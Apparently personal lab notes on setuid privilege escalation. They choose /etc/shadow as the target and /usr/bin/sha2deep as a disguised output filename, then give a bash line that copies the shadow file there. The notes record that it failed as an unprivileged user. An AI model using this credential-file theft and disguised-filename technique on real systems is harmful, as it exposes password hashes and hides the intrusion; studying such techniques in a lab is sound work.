# Privilege Escalation via Setuid Binary
## I. Concept

### 1. Chose a file to target
```bash
/etc/shadow
```
decided to select shadow
 
### 2. Chose output directory/filename
```bash
/usr/bin/sha2deep
```
Output masquerading as legitimate blending in with normal system filenames in /usr/bin

### 3. Create script:
```bash
#!/bin/bash
cat /etc/shadow > /usr/bin/sha2deep
```
Ran as normal user; permission denied as expected

